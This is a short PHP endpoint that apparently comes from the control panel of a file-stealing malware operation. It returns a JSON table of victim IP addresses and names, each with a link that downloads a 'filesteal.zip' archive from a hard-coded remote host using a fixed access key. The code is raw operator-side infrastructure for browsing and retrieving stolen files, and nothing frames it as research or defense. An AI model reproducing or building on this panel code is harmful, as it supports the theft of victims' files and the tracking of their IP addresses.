<?php
header('Content-Type: application/json');
include('../class/include.php');
if (!Account::isAuthentified() || !CSRF::isAjaxRequest())
{
    die("Bad request");
}

$all_fs_predata = Server::GetAllFileSteal();
$list = [];

foreach ($all_fs_predata as $data)
{    
	   $button_dl = '<a href="http://duck-drm.tk/beta/core/ajax/fs/download-fs.php?ik=45133722&ip='.$data['id'].'" type="button" download="filesteal.zip" class="btn btn-success btn-sm"><i class="fas fa-download"></i></a>';
	        
	    array_push($list, ["DT_RowId" => $data['id'], $data['ip'], $data['name'], $button_dl]);
}

echo json_encode(['data' => $list]);
?>